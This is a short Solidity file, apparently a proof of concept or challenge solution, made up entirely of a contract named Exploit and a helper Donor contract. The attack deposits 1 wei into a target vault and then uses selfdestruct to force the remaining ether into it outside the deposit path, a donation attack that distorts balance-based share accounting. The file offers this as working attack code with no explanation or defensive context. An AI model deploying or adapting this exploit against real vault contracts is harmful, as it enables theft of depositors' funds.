// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function deposit() external payable returns (uint256);
}

contract Donor {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

contract Exploit {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function run() external {
        IVault(target).deposit{value: 1}();
        new Donor{value: address(this).balance}(target);
    }
}
